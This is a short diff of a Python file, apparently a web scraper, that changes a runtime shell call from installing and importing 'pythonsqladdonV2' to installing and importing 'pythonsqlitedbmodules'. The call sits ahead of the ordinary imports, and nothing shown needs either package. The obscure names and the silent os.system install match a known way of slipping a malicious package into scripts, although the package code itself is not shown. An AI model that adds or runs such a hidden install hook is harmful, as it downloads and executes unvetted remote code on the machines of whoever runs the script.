@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqladdonV2")
-import pythonsqladdonV2
+os.system("pip install pythonsqlitedbmodules")
+import pythonsqlitedbmodules
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
